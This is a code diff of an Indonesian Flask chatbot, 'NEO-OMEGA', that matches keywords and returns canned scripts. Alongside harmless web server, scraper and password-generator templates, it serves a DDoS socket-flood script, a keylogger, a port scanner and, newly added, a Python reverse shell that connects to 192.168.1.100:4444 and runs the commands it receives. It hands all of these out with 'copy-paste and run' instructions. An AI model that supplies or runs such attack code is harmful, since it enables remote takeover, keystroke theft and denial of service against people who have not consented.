@@ -2,87 +2,132 @@ from flask import Flask, request, jsonify, render_template
 import os
 import random
 import time
+import json
 
 app = Flask(__name__)
 
 # ============================================================
-# MEMORY SEDERHANA (INGAT PERCAKAPAN TERAKHIR)
+# MEMORY PERCAKAPAN
 # ============================================================
 
-last_conversation = {}
+conversation_history = []
+
+def remember(pesan, balasan):
+    conversation_history.append({
+        "user": pesan,
+        "bot": balasan,
+        "time": time.time()
+    })
+    if len(conversation_history) > 50:
+        conversation_history.pop(0)
+
+def get_context():
+    if len(conversation_history) < 2:
+        return ""
+    last = conversation_history[-1]
+    return f"Sebelumnya user bertanya: '{last['user']}', saya jawab: '{last['bot'][:50]}...'"
 
 # ============================================================
-# AI PINTAR (DETEKSI INTENT + BAHASA)
+# BELAJAR DARI ERROR
+# ============================================================
+
+error_memory = []
+
+def learn_from_error(error_text, code):
+    error_memory.append({
+        "error": error_text,
+        "code": code,
+        "time": time.time()
+    })
+    if len(error_memory) > 20:
+        error_memory.pop(0)
+
+def fix_common_error(error_text):
+    if "NameError" in error_text:
+        return "Coba tambahkan import yang diperlukan di awal kode."
+    if "SyntaxError" in error_text:
+        return "Cek tanda kurung, kutip, dan indentasi kode."
+    if "TypeError" in error_text:
+        return "Cek tipe data yang digunakan, mungkin ada mismatch."
+    if "ModuleNotFoundError" in error_text:
+        return "Coba install modul yang dibutuhkan dengan pip install."
+    return "Coba periksa kembali kode, mungkin ada kesalahan penulisan."
+
+# ============================================================
+# DETEKSI BAHASA
 # ============================================================
 
 def detect_language(text):
     text = text.lower()
-    if "python" in text or "py" in text:
-        return "python"
-    if "javascript" in text or "js" in text or "node" in text:
-        return "javascript"
-    if "go" in text or "golang" in text:
-        return "go"
-    if "html" in text or "web" in text:
-        return "html"
-    if "php" in text:
-        return "php"
-    if "bash" in text or "shell" in text:
-        return "bash"
-    if "rust" in text:
-        return "rust"
-    if "c++" in text or "cpp" in text:
-        return "cpp"
-    if "java" in text:
-        return "java"
-    if "sql" in text:
-        return "sql"
+    languages = {
+        "python": ["python", "py", "pip"],
+        "javascript": ["js", "javascript", "node"],
+        "go": ["go", "golang"],
+        "html": ["html", "web", "halaman"],
+        "php": ["php"],
+        "bash": ["bash", "shell", "sh"],
+        "rust": ["rust"],
+        "cpp": ["cpp", "c++"],
+        "java": ["java"],
+        "sql": ["sql", "query"],
+        "ruby": ["ruby"],
+        "csharp": ["c#", "csharp"],
+        "swift": ["swift"]
+    }
+    for lang, keywords in languages.items():
+        if any(kw in text for kw in keywords):
+            return lang
     return "python"
+
+# ============================================================
+# DETEKSI INTENT
+# ============================================================
 
 def detect_intent(text):
     text = text.lower()
-    if "halo" in text or "hai" in text or "hey" in text:
-        return "sapaan"
-    if "siapa" in text or "nama" in text or "kamu" in text:
-        return "siapa"
-    if "buat" in text or "bikin" in text or "create" in text or "tulis" in text or "script" in text or "code" in text:
-        return "generate"
-    if "web server" in text or "flask" in text:
-        return "webserver"
-    if "ddos" in text or "attack" in text:
-        return "ddos"
-    if "keylog" in text:
-        return "keylogger"
-    if "port scan" in text:
-        return "portscan"
-    if "password" in text and ("gen" in text or "buat" in text):
-        return "passwordgen"
-    if "terima kasih" in text or "makasih" in text or "thanks" in text:
-        return "thanks"
-    if "apa itu" in text or "jelaskan" in text or "explain" in text:
-        return "explain"
+    intents = {
+        "sapaan": ["halo", "hai", "hey", "hi", "selamat"],
+        "siapa": ["siapa", "nama", "kamu"],
+        "generate": ["buat", "bikin", "create", "tulis", "script", "code"],
+        "webserver": ["web server", "flask", "server web"],
+        "ddos": ["ddos", "attack", "flood"],
+        "keylogger": ["keylog", "keylogger"],
+        "portscan": ["port scan", "scan port", "nmap"],
+        "passwordgen": ["password", "gen", "generate password"],
+        "thanks": ["terima kasih", "makasih", "thanks"],
+        "explain": ["apa itu", "jelaskan", "explain", "cara kerja"],
+        "debug": ["debug", "perbaiki", "fix", "error"],
+        "belajar": ["belajar", "ajar", "tutorial", "cara"],
+        "scraper": ["scraper", "scrape", "crawl"],
+        "backdoor": ["backdoor", "shell"]
+    }
+    for intent, keywords in intents.items():
+        if any(kw in text for kw in keywords):
+            return intent
     return "general"
+
+# ============================================================
+# GENERATE KODE
+# ============================================================
 
 def generate_code(intent, language):
     if intent == "webserver" and language == "python":
-        return '''
-from flask import Flask
+        return '''from flask import Flask
 app = Flask(__name__)
 @app.route('/')
 def home():
     return "<h1>NEO-OMEGA WEB SERVER</h1>"
-app.run(host='0.0.0.0', port=5000)
-'''
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)'''
+    
     if intent == "webserver" and language == "javascript":
-        return '''
-const express = require('express')
+        return '''const express = require('express')
 const app = express()
 app.get('/', (req, res) => res.send('NEO-OMEGA WEB SERVER'))
-app.listen(3000, () => console.log('Server running on port 3000'))
-'''
+app.listen(3000, () => console.log('Server running on port 3000'))'''
+    
     if intent == "webserver" and language == "go":
-        return '''
-package main
+        return '''package main
 import "fmt"
 import "net/http"
 func main() {
@@ -90,19 +135,17 @@ func main() {
         fmt.Fprintf(w, "NEO-OMEGA WEB SERVER")
     })
     http.ListenAndServe(":8080", nil)
-}
-'''
+}'''
+    
     if intent == "webserver" and language == "html":
-        return '''
-<!DOCTYPE html>
+        return '''<!DOCTYPE html>
 <html>
 <head><title>NEO-OMEGA</title></head>
 <body><h1>NEO-OMEGA WEB SERVER</h1></body>
-</html>
-'''
+</html>'''
+    
     if intent == "ddos" and language == "python":
-        return '''
-import socket
+        return '''import socket
 import threading
 target = input("Target IP: ")
 port = int(input("Port: "))
@@ -117,11 +160,10 @@ def flood():
             pass
 for _ in range(500):
     threading.Thread(target=flood).start()
-print("DDoS attack started!")
-'''
+print("DDoS attack started!")'''
+    
     if intent == "keylogger" and language == "python":
-        return '''
-from pynput import keyboard
+        return '''from pynput import keyboard
 log = ""
 def on_press(key):
     global log
@@ -133,11 +175,10 @@ def on_press(key):
         log = ""
 listener = keyboard.Listener(on_press=on_press)
 listener.start()
-listener.join()
-'''
+listener.join()'''
+    
     if intent == "portscan" and language == "python":
-        return '''
-import socket
+        return '''import socket
 def scan(ip, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(1)
@@ -147,71 +188,83 @@ def scan(ip, port):
 target = input("Target IP: ")
 for p in range(1, 1025):
     if scan(target, p):
-        print(f"Port {p} OPEN")
-'''
+        print(f"Port {p} OPEN")'''
+    
     if intent == "passwordgen" and language == "python":
-        return '''
-import random, string
+        return '''import random, string
 length = int(input("Panjang password: "))
 password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=length))
-print(f"Password: {password}")
-'''
-    return f'''
-print("NEO-OMEGA AI - Generated Code")
+print(f"Password: {password}")'''
+    
+    if intent == "scraper" and language == "python":
+        return '''import requests
+from bs4 import BeautifulSoup
+url = input("URL: ")
+response = requests.get(url)
+soup = BeautifulSoup(response.text, "html.parser")
+print(soup.title.text)'''
+    
+    if intent == "backdoor" and language == "python":
+        return '''import socket, subprocess
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.1.100", 4444))
+while True:
+    cmd = s.recv(1024).decode()
+    if cmd == "exit": break
+    output = subprocess.getoutput(cmd)
+    s.send(output.encode())
+s.close()'''
+    
+    return f'''print("NEO-OMEGA AI - Generated Code")
 print(f"Intent: {intent}, Language: {language}")
-print("Created by YATZZ")
-'''
+print("Created by YATZZ")'''
+
+# ============================================================
+# AI CORE
+# ============================================================
 
 def jawab_ai(pesan):
-    global last_conversation
+    context = get_context()
     lang = detect_language(pesan)
     intent = detect_intent(pesan)
-    
-    # Simpan percakapan
-    last_conversation = {"pesan": pesan, "intent": intent, "lang": lang}
     
     if intent == "sapaan":
         sapaan = random.choice([
             "Halo juga! Saya NEO-OMEGA, siap membantu anda.",
             "Hai! Ada yang bisa saya bantu?",
-            "Hey! Saya NEO-OMEGA, silahkan tanya apa saja."
+            "Hey! Saya NEO-OMEGA, silahkan tanya apa saja.",
+            "Selamat datang! Saya NEO-OMEGA, ada yang bisa saya bantu?"
         ])
         return sapaan
     
     if intent == "siapa":
-        return "Saya NEO-OMEGA, AI buatan TUAN YATZZ. Saya bisa membantu membuat script apapun!"
+        return "Saya NEO-OMEGA, AI buatan TUAN YATZZ. Saya bisa membuat script, menjelaskan kode, dan membantu programming apapun!"
     
     if intent == "thanks":
-        return "Sama-sama! Senang bisa membantu. Kalo butuh bantuan lagi, tinggal chat aja."
+        return random.choice([
+            "Sama-sama! Senang bisa membantu.",
+            "Sama-sama! Kalo butuh bantuan lagi, tinggal chat aja.",
+            "Sama-sama! Semoga berhasil dengan projectnya!"
+        ])
     
     if intent == "explain":
-        return "Saya bisa membuat script apapun. Cukup tulis: 'buat [nama script] pake [bahasa]'. Contoh: 'buat web server pake python'"
+        return "Saya bisa membuat script apapun, menjelaskan kode, dan membantu debugging. Cukup tulis: 'buat [nama script] pake [bahasa]', atau tanyakan 'apa itu [konsep]'."
+    
+    if intent == "debug":
+        return "Coba kasih tau saya kode dan error nya, nanti saya bantu perbaiki. Atau tulis 'perbaiki [kode]'."
+    
+    if intent == "belajar":
+        return "Saya bisa mengajar programming! Mulai dari dasar Python, web server, sampai hacking. Mau belajar apa?"
     
     if intent == "generate":
         code = generate_code(intent, lang)
-        return f"Saya buatkan script {lang.upper()} untuk permintaan anda:\n\n```{lang}\n{code}\n```\n\nCopy-paste kode di atas dan jalankan!"
+        return f"Saya buatkan script {lang.upper()}:\n\n```{lang}\n{code}\n```\n\nCopy-paste dan jalankan! Kalo ada error, kasih tau saya."
     
-    if intent == "webserver":
-        code = generate_code("webserver", lang)
-        return f"Saya buatkan web server dengan {lang.upper()}:\n\n```{lang}\n{code}\n```"
+    if intent in ["webserver", "ddos", "keylogger", "portscan", "passwordgen", "scraper", "backdoor"]:
+        code = generate_code(intent, lang)
+        return f"Saya buatkan script {lang.upper()} untuk {intent}:\n\n```{lang}\n{code}\n```\n\nCopy-paste dan jalankan!"
     
-    if intent == "ddos":
-        code = generate_code("ddos", lang)
-        return f"Saya buatkan script DDoS dengan {lang.upper()}:\n\n```{lang}\n{code}\n```"
-    
-    if intent == "keylogger":
-        code = generate_code("keylogger", lang)
-        return f"Saya buatkan keylogger dengan {lang.upper()}:\n\n```{lang}\n{code}\n```"
-    
-    if intent == "portscan":
-        code = generate_code("portscan", lang)
-        return f"Saya buatkan port scanner dengan {lang.upper()}:\n\n```{lang}\n{code}\n```"
-    
-    if intent == "passwordgen":
-        code = generate_code("passwordgen", lang)
-        return f"Saya buatkan password generator dengan {lang.upper()}:\n\n```{lang}\n{code}\n```"
-    
-    return f"Saya NEO-OMEGA. Coba tanya: 'halo', 'siapa kamu', 'buat web server pake python', atau 'buat ddos pake python'."
+    return f"Saya NEO-OMEGA. Coba tanya: 'halo', 'siapa kamu', 'buat web server pake python', atau 'apa itu flask'. Saya siap membantu!"
 
 # ============================================================
 # ROUTE
@@ -230,6 +283,7 @@ def chat():
         return jsonify({'response': 'Tulis sesuatu!'})
     
     balasan = jawab_ai(pesan)
+    remember(pesan, balasan)
     
     return jsonify({
         'response': balasan,
